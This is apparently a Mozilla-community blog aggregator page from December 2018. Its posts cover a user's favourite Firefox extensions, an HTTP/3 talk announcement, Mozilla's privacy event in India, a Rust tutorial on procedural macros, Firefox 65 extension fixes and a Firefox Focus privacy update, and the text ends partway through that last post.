<p>This let's me use <a href="https://www.youtube.com/watch?v=Gy7lyvAfOSw" hreflang="en">Containers</a> , in a smoother fashion, if forces some domains to be opened in type of container. For instance Facebook is forced to my shopping container (and that's the only thing going into that container).</p>


<h3><a href="https://addons.mozilla.org/en-US/firefox/addon/grammalecte-fr/" hreflang="fr" title="Extension pour corriger grammaire et orthographe">Grammalecte</a> &amp;&amp; <a href="https://addons.mozilla.org/en-US/firefox/addon/grammarly-1/" hreflang="en">Grammarly</a> for Firefox</h3>

<p>because I'm so bad at spelling and grammar. These free tools help me with both french and English. I'd use druide's <a href="https://www.antidote.info/en/buy" hreflang="en" title="Grammar and Spell checker">Antidote</a> if I wasn't so cheap.</p>


<h3><a href="https://addons.mozilla.org/en-US/firefox/addon/https-everywhere/" hreflang="en">HTTPS everywhere</a></h3>

<p>Less needed than a few years ago, it helps me secure my web exploration.</p>


<h3><a href="https://addons.mozilla.org/en-US/firefox/addon/mastodon-share/" hreflang="en">Mastodon Share</a></h3>

<p>Because I use <a href="https://joinmastodon.org/" hreflang="en">Mastodon</a> as my preferred social network and that Mastodon button are not always present on websites. I hope that with the demise of G+, g+ share buttons will be replace with mastodon ones.</p>


<h3><a href="https://addons.mozilla.org/en-US/firefox/addon/pinboardin/" hreflang="en">Pinboard</a></h3>

<p>Because I liked sharing and saving my bookmarks (delicio.us was a very nice social experience).</p>


<h3><a href="https://addons.mozilla.org/en-US/firefox/addon/security-report-card/" hreflang="en">Security Report Card</a></h3>

<p>Cause I like to make the web more secure and , I can easily spot the rating when visiting a site. This let's me quickly decide that I will contact the site owner of not and let him know that his site could be configured better.</p>


<h3><a href="https://addons.mozilla.org/en-US/firefox/addon/universal-amazon-killer/" hreflang="en">Universal Amazon Killer</a></h3>

<p>So I don't have to search too much and can use amazon as a search engine and then shop locally</p>


<h3><a href="https://addons.mozilla.org/en-US/firefox/addon/wayback-machine_new/" hreflang="en" title="No more 404 with this great extension">Wayback machine</a></h3>

<p>so I don't stumble too much on 404 :)</p>


<h3><a href="https://addons.mozilla.org/en-US/firefox/addon/first-party-isolation/" hreflang="en">First Party Isolation</a></h3>

<p>because I was too lazy to flip a preference.</p></div></div><div class="permalink"><a href="https://www.hirlimann.net/Ludovic/carnet/?post/2018/12/21/December-2018-what-extensions-do-I-use-in-Firefox-dsktop">by Ludovic Hirlimann at <time datetime="2018-12-21T14:07:55Z" title="December 21, 2018 02:07 PM GMT">‰∏ãÂçà10:07:55</time></a></div></div><div class="news daniel-stenberg" xml:lang="en-US"><a id="news-6"></a><h3><a href="https://daniel.haxx.se/blog" title="daniel.haxx.se">Daniel Stenberg</a> ‚Äî <a href="https://daniel.haxx.se/blog/2018/12/21/http-3-talk-in-stockholm-on-january-22/">HTTP/3 talk in Stockholm on January 22</a></h3><div class="entry"><div class="content"><figure class="wp-block-image"><img alt="" class="wp-image-11899" src="goto10-1000.jpg" /></figure>



<h3>HTTP/3 ‚Äì the coming HTTP version</h3>



<p><em>					This time TCP is replaced by the new transport protocol QUIC and things are different yet again! This is a presentation by Daniel Stenberg about HTTP/3 and QUIC with a following Q&amp;A about everything HTTP.</em></p>



<p>The presentation will be done in English. It will be recorded and possibly live-streamed. Organized by me, together with our friends at goto10. It is free of charge, but you need to register.<br /></p>



<h4>When<br /></h4>



<p style="text-align: center;"><strong>17:30 ‚Äì 19:00<br />January 22, 2019</strong><br /><strong>Goto 10: H√∂rsalen, Hammarby Kaj 10D plan 5</strong><br /></p>



<p><a href="https://www.goto10.se/evenemang/http-3/">Register here!</a></p>



<h4>Fancy map to goto 10<br /></h4>



<p><br /></p></div></div><div class="permalink"><a href="https://daniel.haxx.se/blog/2018/12/21/http-3-talk-in-stockholm-on-january-22/">by Daniel Stenberg at <time datetime="2018-12-21T11:07:21Z" title="December 21, 2018 11:07 AM GMT">‰∏ãÂçà7:07:21</time></a></div></div><div class="news mozilla-open-policy-advocacy-blog" xml:lang="en-US"><a id="news-7"></a><h3><a href="https://blog.mozilla.org/netpolicy" title="Open Policy &amp; Advocacy">Mozilla Open Policy &amp; Advocacy Blog</a> ‚Äî <a href="https://blog.mozilla.org/netpolicy/2018/12/21/privacy-in-practice-mozilla-talks-lean-data-in-india/">Privacy in practice: Mozilla talks ‚Äúlean data‚Äù in India</a></h3><div class="entry"><div class="content"><p><em>How can businesses best implement privacy principles?</em> On November 26th, Mozilla hosted its first ‚ÄúPrivacy Matters‚Äù event in New Delhi, bringing together representatives from some of India‚Äôs leading and upcoming online businesses. The session was aimed at driving a practical conversation around how companies can better protect user data, and the multiple incentives to do so.</p>
<p>This conversation is timely. The European GDPR came into force this May and had ripple effects on many Indian companies. India itself is well on its way to having its first comprehensive data protection law. We‚Äôve been vocal in our support for a strong law, see <a href="https://blog.mozilla.org/netpolicy/files/2018/10/Mozilla-Submission_MEITY_PDP-Bill-2018.pdf">here</a> and <a href="https://blog.mozilla.org/netpolicy/files/2018/02/Mozilla-submission-to-Srikrishna-Committee.pdf">here</a> for our submissions to the Indian government. Conducted with Mika Shah, Lead Product and Data Counsel at Mozilla Headquarters in Mountain View, the meeting saw participation from thirteen companies in India, ranging from SMEs to large conglomerates, including Zomato, Ibibo, Dunzo, Practo and Zeotap. There was a mix of representatives across engineering, c-level, and legal/policy teams of these companies. The discussions were divided into three segments as per <a href="https://www.leandatapractices.com/">Mozilla‚Äôs Lean Data framework</a>, covering key topics: ‚ÄúEngage users‚Äù, ‚ÄúStay Lean‚Äù, and ‚ÄúBuild-in Security‚Äù.</p>
<p><b>Engage Users</b></p>
<p>The first segment of the discussion focussed on how companies can better engage different audiences on issues of privacy. This ranges from making privacy policies more accessible and explaining data collection through ‚Äújust-in-time‚Äù notifications to users to better engaging investors and boards on privacy concerns to gain their support for implementing reforms. Many companies argued that providing more choices to the Indian user base throws up unique challenges, and that often users can be disinterested or careless about their making choices about their personal data. This only reinforces the importance of user-education and companies agreed they could do more to effectively communicate about data collection, use, and sharing.</p>
<p><b>Stay lean</b></p>
<p>The second section was on the importance of staying ‚Äúlean‚Äù with personal data rather than collecting, storing, and sharing indiscriminately. Most companies agreed that collecting and storing less personal data mitigates the risk of potential privacy leaks, breaches, and vulnerability to broad law enforcement requests. Staying lean does come with its own challenges, given that deleting data trails often comes at a high cost, or may be technically challenging when data has changed hands across vendors. It was agreed that there is a need for more innovative techniques to help pseudonymize or anonymize such datasets to reduce the risk of identification of end-users while maintaining the value of service. Despite these challenges, responsible companies should do their best to adhere to the principle of deleting data within their control, when no longer required.</p>
<p><b>Build-in security</b></p>
<p>The final segment covered key security features that could be built in to the services. For many startups, their emphasis on security practices, especially relating to employee data access controls, have increased as they grew in size. Participants in the event also spoke to concerns around the security practices of their vendors; these corporate partners often resist scrutiny of their security and/or are unwilling to negotiate terms, making it hard for companies to meet their obligations to their users and under the law.</p>
<p>Following the event, all of the participants confirmed that they‚Äôre intending to make changes to their privacy practices. It‚Äôs great to see such enthusiasm and commitment to protecting user privacy and championing these issues within their respective companies. We look forward to hosting further iterations of this event in India. For more information about the Lean Data Practices, see: <a href="https://www.leandatapractices.com/">https://www.leandatapractices.com/</a></p>
<p>¬†</p>
<p>The post <a href="https://blog.mozilla.org/netpolicy/2018/12/21/privacy-in-practice-mozilla-talks-lean-data-in-india/" rel="nofollow">Privacy in practice: Mozilla talks ‚Äúlean data‚Äù in India</a> appeared first on <a href="https://blog.mozilla.org/netpolicy" rel="nofollow">Open Policy &amp; Advocacy</a>.</p></div></div><div class="permalink"><a href="https://blog.mozilla.org/netpolicy/2018/12/21/privacy-in-practice-mozilla-talks-lean-data-in-india/">by Amba Kak at <time datetime="2018-12-21T08:31:49Z" title="December 21, 2018 08:31 AM GMT">‰∏ãÂçà4:31:49</time></a></div></div><div class="news the-rust-programming-language-blog" xml:lang="en"><a id="news-8"></a><h3><a href="https://blog.rust-lang.org/" title="Rust Blog">The Rust Programming Language Blog</a> ‚Äî <a href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html">Procedural Macros in Rust 2018</a></h3><div class="entry"><div class="content"><p>Perhaps my favorite feature in the Rust 2018 edition is <a href="https://doc.rust-lang.org/reference/procedural-macros.html">procedural macros</a>.
Procedural macros have had a long and storied history in Rust (and will continue
to have a storied future!), and now is perhaps one of the best times to get
involved with them because the 2018 edition has so dramatically improved the
experience both defining and using them.</p>
<p>Here I'd like to explore what procedural macros are, what they're capable of,
notable new features, and some fun use cases of procedural macros. I might even
convince you that this is Rust 2018's best feature as well!</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html#what-is-a-procedural-macro" id="what-is-a-procedural-macro"></a>What is a procedural macro?</h3>
<p>First defined over two years ago in <a href="https://github.com/rust-lang/rfcs/blob/master/text/1566-proc-macros.md">RFC 1566</a>, procedural macros are, in
layman's terms, a function that takes a piece of syntax at compile time and
produces a new bit of syntax. Procedural macros in Rust 2018 come in one of
three flavors:</p>
<ul>
<li>
<p><strong><code>#[derive]</code> mode macros</strong> have actually been stable since <a href="https://blog.rust-lang.org/2017/02/02/Rust-1.15.html">Rust 1.15</a>
and bring all the goodness and ease of use of <code>#[derive(Debug)]</code> to
user-defined traits as well, such as <a href="https://serde.rs/">Serde</a>'s <code>#[derive(Deserialize)]</code>.</p>
</li>
<li>
<p><strong>Function-like macros</strong> are newly stable to the 2018 edition and allow
defining macros like <code>env!("FOO")</code> or <code>format_args!("...")</code> in a
crates.io-based library. You can think of these as sort of "<code>macro_rules!</code>
macros" on steroids.</p>
</li>
<li>
<p><strong>Attribute macros</strong>, my favorite, are also new in the 2018 edition
and allow you to provide lightweight annotations on Rust functions which
perform syntactical transformations over the code at compile time.</p>
</li>
</ul>
<p>Each of these flavors of macros can be defined in a crate with <code>proc-macro = true</code> <a href="https://doc.rust-lang.org/cargo/reference/manifest.html">specified in its manifest</a>. When used, a procedural macro is
loaded by the Rust compiler and executed as the invocation is expanded. This
means that Cargo is in control of versioning for procedural macros and you can
use them with all same ease of use you'd expect from other Cargo dependencies!</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html#defining-a-procedural-macro" id="defining-a-procedural-macro"></a>Defining a procedural macro</h3>
<p>Each of the three types of procedural macros are <a href="https://doc.rust-lang.org/stable/reference/procedural-macros.html">defined in a slightly different
fashion</a>, and here we'll single out attribute macros. First, we'll flag
<code>Cargo.toml</code>:</p>
<pre><code class="language-toml">[lib]
proc-macro = true
</code></pre>
<p>and then in <code>src/lib.rs</code> we can write our macro:</p>
<pre><code class="language-rust">extern crate proc_macro;
use proc_macro::TokenStream;

#[proc_macro_attribute]
pub fn hello(attr: TokenStream, item: TokenStream) -&gt; TokenStream {
    // ...
}
</code></pre>
<p>We can then write some unit tests in <code>tests/smoke.rs</code>:</p>
<pre><code class="language-rust">#[my_crate::hello]
fn wrapped_function() {}

#[test]
fn works() {
    wrapped_function();
}
</code></pre>
<p>... and that's it! When we execute <code>cargo test</code> Cargo will compile our
procedural macro. Afterwards it will compile our unit test which loads the macro
at compile time, executing the <code>hello</code> function and compiling the resulting
syntax.</p>
<p>Right off the bat we can see a few important properties of procedural macros:</p>
<ul>
<li>The input/output is this fancy <code>TokenStream</code> type we'll talk about more in a
bit</li>
<li>We're <em>executing arbitrary code</em> at compile time, which means we can do just
about anything!</li>
<li>Procedural macros are incorporated with the module system, meaning they can
be imported just like any other name.</li>
</ul>
<p>Before we take a look at implementing a procedural macro, let's first dive into
some of these points.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html#macros-and-the-module-system" id="macros-and-the-module-system"></a>Macros and the module system</h3>
<p>First stabilized in <a href="https://blog.rust-lang.org/2018/10/25/Rust-1.30.0.html">Rust 1.30</a> (noticing a trend with 1.15?) macros are now
integrated with the module system in Rust. This mainly means that you no longer
need the clunky <code>#[macro_use]</code> attribute when importing macros! Instead of this:</p>
<pre><code class="language-rust">#[macro_use]
extern crate log;

fn main() {
    debug!("hello, ");
    info!("world!");
}
</code></pre>
<p>you can do:</p>
<pre><code class="language-rust">use log::info;

fn main() {
    log::debug!("hello, ");
    info!("world!");
}
</code></pre>
<p>Integration with the module system solves one of the most confusing parts about
macros historically. They're now imported and namespaced just as you would any
other item in Rust!</p>
<p>The benefits are not only limited to bang-style <code>macro_rules</code> macros, as you can
now transform code that looks like this:</p>
<pre><code class="language-rust">#[macro_use]
extern crate serde_derive;

#[derive(Deserialize)]
struct Foo {
    // ...
}
</code></pre>
<p>into</p>
<pre><code class="language-rust">use serde::Deserialize;

#[derive(Deserialize)]
struct Foo {
    // ...
}
</code></pre>
<p>and you don't even need to explicitly depend on <code>serde_derive</code> in <code>Cargo.toml</code>!
All you need is:</p>
<pre><code class="language-toml">[dependencies]
serde = { version = '1.0.82', features = ['derive'] }
</code></pre>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html#whats-inside-a-tokenstream?" id="whats-inside-a-tokenstream?"></a>What's inside a <code>TokenStream</code>?</h3>
<p>This mysterious <code>TokenStream</code> type comes from the <a href="https://doc.rust-lang.org/proc_macro/">compiler-provided
<code>proc_macro</code> crate</a>. When it was first added all you could do with a
<a href="https://doc.rust-lang.org/stable/proc_macro/struct.TokenStream.html"><code>TokenStream</code></a> was call convert it to or from a string using <code>to_string()</code> or <code>parse()</code>.
As of Rust 2018, you can act on the tokens in a <a href="https://doc.rust-lang.org/stable/proc_macro/struct.TokenStream.html"><code>TokenStream</code></a> directly.</p>
<p>A <a href="https://doc.rust-lang.org/stable/proc_macro/struct.TokenStream.html"><code>TokenStream</code></a> is effectively "just" an iterator over <a href="https://doc.rust-lang.org/stable/proc_macro/enum.TokenTree.html"><code>TokenTree</code></a>. All
syntax in Rust falls into one of these four categories, the four variants of
<a href="https://doc.rust-lang.org/stable/proc_macro/enum.TokenTree.html"><code>TokenTree</code></a>:</p>
<ul>
<li><code>Ident</code> is any identifier like <code>foo</code> or <code>bar</code>. This also contains keywords
such as <code>self</code> and <code>super</code>.</li>
<li><code>Literal</code> include things like <code>1</code>, <code>"foo"</code>, and <code>'b'</code>. All literals are one
token and represent constant values in a program.</li>
<li><code>Punct</code> represents some form of punctuation that's not a delimiter. For
example <code>.</code> is a <code>Punct</code> token in the field access of <code>foo.bar</code>.
Multi-character punctuation like <code>=&gt;</code> is represented as two <code>Punct</code> tokens,
one for <code>=</code> and one for <code>&gt;</code>, and the <code>Spacing</code> enum says that the <code>=</code> is
adjacent to the <code>&gt;</code>.</li>
<li><code>Group</code> is where the term "tree" is most relevant, as <code>Group</code> represents a
delimited sub-token-stream. For example <code>(a, b)</code> is a <code>Group</code> with parentheses
as delimiters, and the internal token stream is <code>a, b</code>.</li>
</ul>
<p>While this is conceptually simple, this may sound like there's not much we can
do with this! It's unclear, for example, how we might parse a function from a
<code>TokenStream</code>. The minimality of <code>TokenTree</code> is crucial, however, for
stabilization. It would be infeasible to stabilize the Rust AST because that
means we could never change it. (imagine if we couldn't have added the <code>?</code>
operator!)</p>
<p>By using <code>TokenStream</code> to communicate with procedural macros, the compiler is
able to add new language syntax while also being able to compile
and work with older procedural macros. Let's see now, though, how we can
actually get useful information out of a <code>TokenStream</code>.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html#parsing-a-tokenstream" id="parsing-a-tokenstream"></a>Parsing a <code>TokenStream</code></h3>
<p>If <code>TokenStream</code> is just a simple iterator, then we've got a long way to go from
that to an actual parsed function. Although the code is already lexed for us
we still need to write a whole Rust parser! Thankfully though the community has
been hard at work to make sure writing procedural macros in Rust is as smooth as
can be, so you need look no further than the <a href="https://crates.io/crates/syn"><code>syn</code> crate</a>.</p>
<p>With the <a href="https://crates.io/crates/syn"><code>syn</code></a> crate we can parse any Rust AST as a one-liner:</p>
<pre><code class="language-rust">#[proc_macro_attribute]
pub fn hello(attr: TokenStream, item: TokenStream) -&gt; TokenStream {
    let input = syn::parse_macro_input!(item as syn::ItemFn);
    let name = &amp;input.ident;
    let abi = &amp;input.abi;
    // ...
}
</code></pre>
<p>The <a href="https://crates.io/crates/syn"><code>syn</code></a> crate not only comes with the ability to parse built-in syntax
but you can also easily write a recursive descent parser for your own syntax.
The <a href="https://docs.rs/syn/0.15/syn/parse/index.html"><code>syn::parse</code> module</a> has more information about this capability.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html#producing-a-tokenstream" id="producing-a-tokenstream"></a>Producing a <code>TokenStream</code></h3>
<p>Not only do we take a <code>TokenStream</code> as input with a procedural macro, but we
also need to produce a <code>TokenStream</code> as output. This output is typically
required to be valid Rust syntax, but like the input it's just list of tokens
that we need to build somehow.</p>
<p>Technically the only way to create a <code>TokenStream</code> is via its <code>FromIterator</code>
implementation, which means we'd have to create each token one-by-one and
collect it into a <code>TokenStream</code>. This is quite tedious, though, so let's take a
look at <a href="https://crates.io/crates/syn"><code>syn</code></a>'s sibling crate: <a href="https://docs.rs/quote/0.6/quote/"><code>quote</code></a>.</p>
<p>The <a href="https://docs.rs/quote/0.6/quote/"><code>quote</code></a> crate is a quasi-quoting implementation for Rust which primarily
provides a convenient macro for us to use:</p>
<pre><code class="language-rust">use quote::quote;

#[proc_macro_attribute]
pub fn hello(attr: TokenStream, item: TokenStream) -&gt; TokenStream {
    let input = syn::parse_macro_input!(item as syn::ItemFn);
    let name = &amp;input.ident;

    // Our input function is always equivalent to returning 42, right?
    let result = quote! {
        fn #name() -&gt; u32 { 42 }
    };
    result.into()
}
</code></pre>
<p>The <a href="https://docs.rs/quote/0.6/quote/macro.quote.html"><code>quote!</code> macro</a> allows you to write mostly-Rust syntax and interpolate
variables quickly from the environment with <code>#foo</code>. This removes much of the
tedium of creating a <code>TokenStream</code> token-by-token and allows quickly cobbling
together various pieces of syntax into one return value.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html#tokens-and-span" id="tokens-and-span"></a>Tokens and <code>Span</code></h3>
<p>Perhaps the greatest feature of procedural macros in Rust 2018 is the ability to
customize and use <a href="https://doc.rust-lang.org/proc_macro/struct.Span.html"><code>Span</code></a> information on each token, giving us the ability for
amazing syntactical error messages from procedural macros:</p>
<pre><code>error: expected `fn`
 --&gt; src/main.rs:3:14
  |
3 | my_annotate!(not_fn foo() {});
  |              ^^^^^^
</code></pre>
<p>as well as completely custom error messages:</p>
<pre><code>error: imported methods must have at least one argument
  --&gt; invalid-imports.rs:12:5
   |
12 |     fn f1();
   |     ^^^^^^^^
</code></pre>
<p>A <a href="https://doc.rust-lang.org/proc_macro/struct.Span.html"><code>Span</code></a> can be thought of as a pointer back into an original source file,
typically saying something like "the <code>Ident</code> token<code> foo</code> came from file
<code>bar.rs</code>, line 4, column 5, and was 3 bytes long". This information is
primarily used by the compiler's diagnostics with warnings and error messages.</p>
<p>In Rust 2018 each <a href="https://doc.rust-lang.org/stable/proc_macro/enum.TokenTree.html"><code>TokenTree</code></a> has a <a href="https://doc.rust-lang.org/proc_macro/struct.Span.html"><code>Span</code></a> associated with it. This means that
if you preserve the <a href="https://doc.rust-lang.org/proc_macro/struct.Span.html"><code>Span</code></a> of all input tokens into the output then even
though you're producing brand new syntax the compiler's error messages are still
accurate!</p>
<p>For example, a small macro like:</p>
<pre><code class="language-rust">#[proc_macro]
pub fn make_pub(item: TokenStream) -&gt; TokenStream {
    let result = quote! {
        pub #item
    };
    result.into()
}
</code></pre>
<p>when invoked as:</p>
<pre><code class="language-rust">my_macro::make_pub! {
    static X: u32 = "foo";
}
</code></pre>
<p>is invalid because we're returning a string from a function that should return a
<code>u32</code>, and the compiler will helpfully diagnose the problem as:</p>
<pre><code>error[E0308]: mismatched types
 --&gt; src/main.rs:1:37
  |
1 | my_macro::make_pub!(static X: u32 = "foo");
  |                                     ^^^^^ expected u32, found reference
  |
  = note: expected type `u32`
             found type `&amp;'static str`

error: aborting due to previous error

</code></pre>
<p>And we can see here that although we're generating brand new syntax, the
compiler can preserve span information to continue to provide targeted
diagnostics about code that we've written.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html#procedural-macros-in-the-wild" id="procedural-macros-in-the-wild"></a>Procedural Macros in the Wild</h3>
<p>Ok up to this point we've got a pretty good idea about what procedural macros
can do and the various capabilities they have in the 2018 edition. As such a
long-awaited feature, the ecosystem is already making use of these new
capabilities! If you're interested, some projects to keep your eyes on are:</p>
<ul>
<li>
<p><a href="https://crates.io/crates/syn"><code>syn</code></a>, <a href="https://docs.rs/quote/0.6/quote/"><code>quote</code></a>, and <a href="https://docs.rs/proc-macro2/0.4/proc_macro2/"><code>proc-macro2</code></a> are your go-to libraries for
writing procedural macros. They make it easy to define custom parsers, parse
existing syntax, create new syntax, work with older versions of Rust, and much
more!</p>
</li>
<li>
<p><a href="https://serde.rs/">Serde</a> and its derive macros for <code>Serialize</code> and <code>Deserialize</code> are likely the
most used macros in the ecosystem. They sport an <a href="https://serde.rs/attributes.html">impressive amount of
configuration</a> and are a great example of how small annotations
can be so powerful.</p>
</li>
<li>
<p>The <a href="https://github.com/rustwasm/wasm-bindgen"><code>wasm-bindgen</code> project</a> uses attribute macros to easily define
interfaces in Rust and import interfaces from JS. The <code>#[wasm_bindgen]</code>
lightweight annotation makes it easy to understand what's coming in and out,
as well as removing lots of conversion boilerplate.</p>
</li>
<li>
<p>The <a href="https://gitlab.gnome.org/federico/gnome-class"><code>gobject_gen!</code> macro</a> is an experimental IDL for the GNOME
project to define GObject objects safely in Rust, eschewing manually writing
all the glue necessary to talk to C and interface with other GObject
instances in Rust.</p>
</li>
<li>
<p>The <a href="https://rocket.rs/">Rocket framework</a> has recently switched over to procedural
macros, and showcases some of nightly-only features of procedural macros like
custom diagnostics, custom span creation, and more. Expect to see these
features stabilize in 2019!</p>
</li>
</ul>
<p>That's just a <em>taste</em> of the power of procedural macros and some example usage
throughout the ecosystem today. We're only 6 weeks out from the original release
of procedural macros on stable, so we've surely only scratched the surface as
well! I'm really excited to see where we can take Rust with procedural macros by
empowering all kinds of lightweight additions and extensions to the language!</p></div></div><div class="permalink"><a href="https://blog.rust-lang.org/2018/12/21/Procedural-Macros-in-Rust-2018.html">by Alex Crichton at <time datetime="2018-12-21T00:00:00Z" title="December 21, 2018 12:00 AM GMT">‰∏äÂçà8:00:00</time></a></div></div><div class="news mozilla-addons-blog" xml:lang="en-US"><a id="news-9"></a><h3><a href="https://blog.mozilla.org/addons" title="Mozilla Add-ons Blog">Mozilla Addons Blog</a> ‚Äî <a href="https://blog.mozilla.org/addons/2018/12/20/extensions-in-firefox-65/">Extensions in Firefox 65</a></h3><div class="entry"><div class="content"><p>In lieu of the normal, detailed review of WebExtensions API coming out in Firefox 65, I‚Äôd like to simply say thank you to everyone for choosing Firefox. Now, more than ever, the web needs people who consciously decide to support an open, private, and safe online ecosystem.</p>
<p>Two weeks ago, nearly every Mozilla employee gathered in Orlando, Florida for the semi-annual all-hands meeting. ¬†It was an opportunity to connect with remote teammates, reflect on the past year and begin sharing ideas for the upcoming year. One of the highlights was the plenary talk by Mitchell Baker, Chairwoman of the Mozilla Foundation. If you have not seen it, it is well worth 15 minutes of your time.</p>
<p></p>
<p>Mitchell talks about Firefox continually adapting to a changing internet, shifting its engagement model over time to remain relevant while staying true to its original mission. Near the end, she notes that it is time, once again, for Mozilla and Firefox to evolve, to shift from being merely a gateway to the internet to being an advocate for users on the internet.</p>
<p>Extensions will need to be part of this movement. We started when Firefox migrated to the WebExtensions API (only a short year ago), ensuring that extensions operated with explicit user permissions within a well-defined sandbox. In 2018, we made a concerted effort to not just add new API, but to also highlight when an extension was using those API to control parts of the browser. In 2019, expect to see us sharpen our focus on user privacy, user security, and user agency.</p>
<p>Thank you again for choosing Firefox, you have our deepest gratitude and appreciation. As a famous Mozillian once said, keep on rockin‚Äô the free web.</p>
<p>-Mike Conca</p>
<p>Highlights of new features and fixes in Firefox 65:</p>
<ul>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1508853">Fixed the post install panel to no longer hide search opt-in panel</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1508144">Right/Middle-clicking on top-level menu item no longer triggers menus.onClicked callback</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1507138">Fixed proxy-API (proxy.settings) handling of a default port 80</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1504008">Protocol handler prompt is bypassed when unnecessary</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1503760">browser.downloads.search now returns 0 byte downloads</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1503600">‚ÄúManage Extension‚Äù and ‚ÄúRemove Extension‚Äù are reordered in browserAction context menu</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1501586">Custom theme scrollbars properly repaint when switching from a dark theme to a light theme</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1500479">Enhanced browser.tabs API to support assigning tab successors</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1500320">browser.omnibox supports special characters including forward slash (/), like Chrome</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1500180">tabs.onCreated is now called for a tab opened after the last tab is closed with ‚Äúbrowser.tabs.closeWindowWithLastTab‚Äù = ‚Äúfalse‚Äù</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1498896">documentUrlPatterns is always used to match the document URL in extension views</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1429488">moz-extension://URL images is supported on Android</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1420744">Using downloads.download() with saveAs=true now works properly</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1370224">Browser and page action default to extension icon rather than puzzle piece</a></li>
</ul>
<p>A huge thank you to the community contributors in this release, including: Ben Armstrong, <a href="https://mozillians.org/Oriol/">Oriol Brufau</a>, <a href="https://mozillians.org/ntim/">Tim Nguyen</a>, <a href="https://mozillians.org/u/rhendric/">Ryan Hendrickson</a>, Sean Burke, <a href="https://mozillians.org/u/Piro/">Yuki ‚ÄúPiro‚Äù Hiroshi</a>, <a href="https://mozillians.org/u/dpino/">Diego Pino</a>, <a href="https://mozillians.org/u/JanH/">Jan Henning</a>, <a href="https://mozillians.org/arshadkazmi42/">Arshad Kazmi</a>, <a href="https://mozillians.org/u/smurfd/">Nicklas Boman</a>.</p>
<p>¬†</p>
<p>The post <a href="https://blog.mozilla.org/addons/2018/12/20/extensions-in-firefox-65/" rel="nofollow">Extensions in Firefox 65</a> appeared first on <a href="https://blog.mozilla.org/addons" rel="nofollow">Mozilla Add-ons Blog</a>.</p></div></div><div class="permalink"><a href="https://blog.mozilla.org/addons/2018/12/20/extensions-in-firefox-65/">by Mike Conca at <time datetime="2018-12-20T23:37:50Z" title="December 20, 2018 11:37 PM GMT">‰∏äÂçà7:37:50</time></a></div></div><h2><time datetime="2018-12-20">Thursday, 20 December 2018</time></h2><div class="news the-mozilla-blog" xml:lang="en-US"><a id="news-10"></a><h3><a href="https://blog.mozilla.org/" title="The Mozilla Blog">The Mozilla Blog</a> ‚Äî <a href="https://blog.mozilla.org/blog/2018/12/20/latest-firefox-focus-provides-more-user-control/">Latest Firefox Focus provides more user control</a></h3><div class="entry"><div class="content"><p>The Internet is a huge playground, but also has a few dark corners. In order to ensure that users still feel secure and protected while browsing, we‚Äôve implemented features that offer privacy and control in all of our products, including Firefox Focus.</p>
<p>Today‚Äôs release truly reflects this philosophy: Android users can now individually decide which publishers they want to share data with and are warned when they access risky content. We also have an update for iOS users with Search Suggestions.</p>
<p><b>Enhanced privacy settings in Firefox Focus</b></p>
<p>We initially created Firefox Focus to provide smartphone users with a tracking-free browsing experience that allows them to feel safe when navigating the web, and do it faster, too. However, cookies and trackers can create snail-paced experiences, and are also used to follow users across the Internet¬†<span class="st">‚Äì</span> often times without their knowledge. At Firefox, we are committed to giving users control and letting them decide what information is collected about them, which is why <a href="https://blog.mozilla.org/futurereleases/2018/08/30/changing-our-approach-to-anti-tracking/" rel="noopener" target="_top">we recently introduced our Enhanced Tracking Protection approach</a> and added corresponding <a href="https://blog.mozilla.org/blog/2018/10/23/latest-firefox-rolls-out-enhanced-tracking-protection/" rel="noopener" target="_top">improvements to Firefox for desktop</a>. Today we are pleased to announce that Firefox Focus is following this lead.</p>
<p>Now you have more choices. You can choose to block all cookies on a website, no cookies at all¬†<span class="st">‚Äì</span> the default so far <span class="st">‚Äì</span>, third party cookies or only 3rd party tracking cookies as defined by<a href="https://disconnect.me/trackerprotection" rel="noopener" target="_top"> Disconnect‚Äôs Tracking Protection list</a>. If you go with the latter option, which is new to Firefox Focus and also the new default, cross-site tracking will be prevented. This enables you to allow cookies if they contribute to the user experience for a website while still preventing trackers from being able to track you across multiple sites, offering you the same products over and over again and recording your online behavior.</p>
<p style="text-align: center;"><img alt="" class="aligncenter size-medium wp-image-11886" src="en_cookieblockoption-300x533.jpg" width="300" height="533" /><i>Firefox Focus now allows users to choose individually which cookies to accept.</i></p>
<p>When you block cookies, you might find that some pages may no longer work properly. But no worries, we‚Äôre here to offer a solution: With just 2 clicks you can now add websites to the new Firefox Focus ‚Äúallowlist‚Äù, which unblocks cookies and trackers for the current page visit. As soon as you navigate to another website, the setting resets so you don‚Äôt have to worry about a forgotten setting that could weaken your privacy.</p>
